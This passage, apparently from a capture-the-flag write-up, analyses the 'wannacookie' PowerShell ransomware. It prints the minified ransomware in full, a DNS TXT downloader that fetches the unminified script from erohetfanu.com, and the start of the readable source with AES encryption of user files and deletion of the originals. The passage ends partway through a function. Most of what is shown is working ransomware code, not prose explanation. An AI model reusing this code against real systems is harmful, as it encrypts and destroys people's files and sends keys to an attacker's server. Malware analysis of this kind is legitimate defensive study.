class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span><span class="k">return</span><span class="p">};</span><span class="k">if</span> <span class="p">($(</span><span class="n">netstat</span> <span class="n">-ano</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;127.0.0.1:8080&quot;</span><span class="p">).</span><span class="n">length</span> <span class="o">-ne</span> <span class="n">0</span> <span class="o">-or</span> <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">Domain</span> <span class="o">-ne</span> <span class="s2">&quot;KRINGLECASTLE&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span><span class="p">};</span><span class="nv">$p_k</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">);</span><span class="nv">$b_k</span> <span class="p">=</span> <span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">($((</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">))</span> <span class="p">+</span> <span class="n">0</span><span class="p">..</span><span class="n">9</span> <span class="p">|</span> <span class="nb">sort </span><span class="p">{</span><span class="nb">Get-Random</span><span class="p">})[</span><span class="n">0</span><span class="p">..</span><span class="n">15</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>  <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span> <span class="o">-ne</span> <span class="n">0x00</span><span class="p">});</span><span class="nv">$h_k</span> <span class="p">=</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$b_k</span><span class="p">);</span><span class="nv">$k_h</span> <span class="p">=</span> <span class="p">$(</span><span class="n">sh1</span> <span class="nv">$h_k</span><span class="p">);</span><span class="nv">$p_k_e_k</span> <span class="p">=</span> <span class="p">(</span><span class="n">p_k_e</span> <span class="nv">$b_k</span> <span class="nv">$p_k</span><span class="p">).</span><span class="n">ToString</span><span class="p">();</span><span class="nv">$c_id</span> <span class="p">=</span> <span class="p">(</span><span class="n">snd_k</span> <span class="nv">$p_k_e_k</span><span class="p">);</span><span class="nv">$d_t</span> <span class="p">=</span> <span class="p">(($(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">ToUniversalTime</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span> <span class="o">-replace</span> <span class="s2">&quot;</span><span class="se">`r`n</span><span class="s2">&quot;</span><span class="p">);</span><span class="no">[array]</span><span class="nv">$f_c</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="p">*.</span><span class="n">elfdb</span> <span class="n">-Exclude</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="n">-Path</span> <span class="p">$($(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Documents&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Videos&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Pictures&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Music&#39;</span><span class="p">))</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">});</span><span class="n">e_n_d</span> <span class="nv">$b_k</span> <span class="nv">$f_c</span> <span class="nv">$true</span><span class="p">;</span><span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;h_k&quot;</span><span class="p">;</span><span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;b_k&quot;</span><span class="p">;</span><span class="nv">$lurl</span> <span class="p">=</span> <span class="s1">&#39;http://127.0.0.1:8080/&#39;</span><span class="p">;</span><span class="nv">$html_c</span> <span class="p">=</span> <span class="p">@{</span><span class="s1">&#39;GET /&#39;</span>  <span class="p">=</span>  <span class="p">$(</span><span class="n">g_o_dns</span> <span class="p">(</span><span class="n">A2H</span> <span class="s2">&quot;source.min.html&quot;</span><span class="p">));</span><span class="s1">&#39;GET /close&#39;</span>  <span class="p">=</span>  <span class="s1">&#39;&lt;p&gt;Bye!&lt;/p&gt;&#39;</span><span class="p">};</span><span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span><span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span><span class="nb">Start-Sleep</span> <span class="n">10</span><span class="p">;</span><span class="nb">Add-type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">;</span><span class="nb">start-process</span> <span class="s2">&quot;$url&quot;</span> <span class="n">-WindowStyle</span> <span class="n">Maximized</span><span class="p">;</span><span class="nb">Start-sleep</span> <span class="n">2</span><span class="p">;</span><span class="no">[System.Windows.Forms.SendKeys]</span><span class="p">::</span><span class="n">SendWait</span><span class="p">(</span><span class="s2">&quot;{F11}&quot;</span><span class="p">)}</span> <span class="n">-Arg</span> <span class="nv">$lurl</span><span class="p">;</span><span class="nv">$list</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">HttpListener</span><span class="p">;</span><span class="nv">$list</span><span class="p">.</span><span class="n">Prefixes</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$lurl</span><span class="p">);</span><span class="nv">$list</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span><span class="k">try</span> <span class="p">{</span><span class="nv">$close</span> <span class="p">=</span> <span class="nv">$false</span><span class="p">;</span><span class="k">while</span> <span class="p">(</span><span class="nv">$list</span><span class="p">.</span><span class="n">IsListening</span><span class="p">)</span> <span class="p">{</span><span class="nv">$context</span> <span class="p">=</span> <span class="nv">$list</span><span class="p">.</span><span class="n">GetContext</span><span class="p">();</span><span class="nv">$Req</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span><span class="nv">$Resp</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span><span class="nv">$recvd</span> <span class="p">=</span> <span class="s1">&#39;{0} {1}&#39;</span> <span class="o">-f</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">httpmethod</span><span class="p">,</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">localpath</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /&#39;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$html</span> <span class="p">=</span> <span class="nv">$html_c</span><span class="p">[</span><span class="nv">$recvd</span><span class="p">]}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /decrypt&#39;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$akey</span> <span class="p">=</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="s2">&quot;key&quot;</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nv">$k_h</span> <span class="o">-eq</span> <span class="p">$(</span><span class="n">sh1</span> <span class="nv">$akey</span><span class="p">))</span> <span class="p">{</span><span class="nv">$akey</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$akey</span><span class="p">);</span><span class="no">[array]</span><span class="nv">$f_c</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">)</span> <span class="n">-Recurse</span>  <span class="n">-Filter</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">});</span><span class="n">e_n_d</span> <span class="nv">$akey</span> <span class="nv">$f_c</span> <span class="nv">$false</span><span class="p">;</span><span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Files have been decrypted!&quot;</span><span class="p">;</span><span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;Invalid Key!&quot;</span><span class="p">}}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /close&#39;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$close</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">;</span><span class="nv">$html</span> <span class="p">=</span> <span class="nv">$html_c</span><span class="p">[</span><span class="nv">$recvd</span><span class="p">]}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /cookie_is_paid&#39;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$c_n_k</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="p">(</span><span class="s2">&quot;$c_id.72616e736f6d697370616964.erohetfanu.com&quot;</span><span class="p">.</span><span class="n">trim</span><span class="p">())</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span> <span class="nv">$c_n_k</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">32</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$html</span> <span class="p">=</span> <span class="nv">$c_n_k</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$html</span> <span class="p">=</span> <span class="s2">&quot;UNPAID|$c_id|$d_t&quot;</span><span class="p">}}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$Resp</span><span class="p">.</span><span class="n">statuscode</span> <span class="p">=</span> <span class="n">404</span><span class="p">;</span><span class="nv">$html</span> <span class="p">=</span> <span class="s1">&#39;&lt;h1&gt;404 Not Found&lt;/h1&gt;&#39;</span><span class="p">};</span><span class="nv">$buffer</span> <span class="p">=</span> <span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$html</span><span class="p">);</span><span class="nv">$Resp</span><span class="p">.</span><span class="n">ContentLength64</span> <span class="p">=</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="nv">$Resp</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">length</span><span class="p">);</span><span class="nv">$Resp</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="k">if</span> <span class="p">(</span><span class="nv">$close</span><span class="p">)</span> <span class="p">{</span><span class="nv">$list</span><span class="p">.</span><span class="n">Stop</span><span class="p">();</span><span class="k">return</span><span class="p">}}}</span> <span class="k">finally</span> <span class="p">{</span><span class="nv">$list</span><span class="p">.</span><span class="n">Stop</span><span class="p">()}};</span><span class="n">wanc</span><span class="p">;</span>
+</pre></div>
+
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>To minify code means to shorten variable names and remove whitespace to make the code more compact.</p>
+</div>
+<p>We could try to clean this up manually using a Powershell code beautifier or some strategic search and replace operations, but it was hinted that there might be an unminified version of the code available.  Since the string "77616E6E61636F6F6B69652E6D696E2E707331" is hex-encoded text string "wannacookie.min.ps1", what if we change it to "77616E6E61636F6F6B69652E707331" (wannacookie.ps1) and execute the code again?  </p>
+<div class="codehilite"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span> <span class="k">return</span> <span class="nv">$o</span><span class="p">};</span> <span class="p">`</span>
+<span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span><span class="p">;</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="p">`</span>
+<span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="p">`</span>
+<span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">};</span> <span class="p">$(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">hhc18</span><span class="p">\</span><span class="n">wannacookie</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+
+
+<p>This time we get a file that's much easier on human eyes.</p>
+<div class="codehilite"><pre><span></span><span class="nv">$functions</span> <span class="p">=</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="n">Enc_Dec</span><span class="o">-File</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
+        <span class="no">[byte[]]</span><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$key</span>
+        <span class="nv">$Suffix</span> <span class="p">=</span> <span class="s2">&quot;`.wannacookie&quot;</span>
+        <span class="no">[System.Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Security.Cryptography&#39;</span><span class="p">)</span>
+        <span class="no">[System.Int32]</span><span class="nv">$KeySize</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">*</span><span class="n">8</span>
+        <span class="nv">$AESP</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="s1">&#39;System.Security.Cryptography.AesManaged&#39;</span>
+        <span class="nv">$AESP</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.CipherMode]</span><span class="p">::</span><span class="n">CBC</span>
+        <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="n">128</span>
+        <span class="nv">$AESP</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="nv">$KeySize</span>
+        <span class="nv">$AESP</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="nv">$key</span>
+        <span class="nv">$FileSR</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$File</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Open</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="nv">$File</span> <span class="p">+</span> <span class="nv">$Suffix</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$File</span> <span class="o">-replace</span> <span class="nv">$Suffix</span><span class="p">)}</span>
+        <span class="nv">$FileSW</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$DestFile</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Create</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$AESP</span><span class="p">.</span><span class="n">GenerateIV</span><span class="p">()</span>
+            <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span> <span class="n">0</span><span class="p">,</span> <span class="n">4</span><span class="p">)</span>
+            <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+            <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">()</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="no">[Byte[]]</span><span class="nv">$LenIV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">4</span>
+            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">,</span> <span class="n">3</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+            <span class="no">[Int]</span><span class="nv">$LIV</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">)</span>
+            <span class="no">[Byte[]]</span><span class="nv">$IV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$LIV</span>
+            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">4</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$LIV</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+            <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="nv">$IV</span>
+            <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">()</span>
+        <span class="p">}</span>
+        <span class="nv">$CryptoS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">CryptoStream</span><span class="p">(</span><span class="nv">$FileSW</span><span class="p">,</span> <span class="nv">$Transform</span><span class="p">,</span> <span class="no">[System.Security.Cryptography.CryptoStreamMode]</span><span class="p">::</span><span class="n">Write</span><span class="p">)</span>
+        <span class="no">[Int]</span><span class="nv">$Count</span> <span class="p">=</span> <span class="n">0</span>
+        <span class="no">[Int]</span><span class="nv">$BlockSzBts</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="n">8</span>
+        <span class="no">[Byte[]]</span><span class="nv">$Data</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$BlockSzBts</span>
+        <span class="k">Do</span>
+        <span class="p">{</span>
+            <span class="nv">$Count</span> <span class="p">=</span> <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$BlockSzBts</span><span class="p">)</span>
+            <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Count</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="k">While</span> <span class="p">(</span><span class="nv">$Count</span> <span class="o">-gt</span> <span class="n">0</span><span class="p">)</span>
+        <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">()</span>
+        <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;key&quot;</span>
+        <span class="nb">Remove-Item</span> <span class="nv">$File</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">)</span>
+    <span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>
+    <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span>
+        <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">A2H</span><span class="p">(){</span>
+    <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+    <span class="nv">$c</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();</span>
+    <span class="k">Foreach</span> <span class="p">(</span><span class="nv">$element</span> <span class="k">in</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$c</span> <span class="p">=</span> <span class="nv">$c</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span> <span class="p">+</span> <span class="no">[System.String]</span><span class="p">::</span><span class="n">Format</span><span class="p">(</span><span class="s2">&quot;{0:X}&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToUInt32</span><span class="p">(</span><span class="nv">$element</span><span class="p">))</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$c</span> <span class="o">-replace</span> <span class="s1">&#39; &#39;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">H2A</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+    <span class="nv">$outa</span>
+    <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$outa</span> <span class="p">=</span> <span class="nv">$outa</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$outa</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">B2H</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="nv">$DEC</span><span class="p">)</span>
+    <span class="nv">$tmp</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$DEC</span><span class="p">){</span>
+        <span class="nv">$a</span> <span class="p">=</span> <span class="s2">&quot;{0:x}&quot;</span> <span class="o">-f</span> <span class="no">[Int]</span><span class="nv">$value</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">1</span><span class="p">){</span>
+            <span class="nv">$tmp</span> <span class="p">+=</span> <span class="s1">&#39;0&#39;</span> <span class="p">+</span> <span class="nv">$a</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$tmp</span> <span class="p">+=</span> <span class="nv">$a</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$tmp</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">ti_rox</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="nv">$b1</span><span class="p">,</span> <span class="nv">$b2</span><span class="p">)</span>
+    <span class="nv">$b1</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b1</span><span class="p">)</span>
+    <span class="nv">$b2</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b2</span><span class="p">)</span>
+    <span class="nv">$cont</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="o">-eq</span> <span class="nv">$b2</span><span class="p">.</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span>
+        <span class="p">{</span>
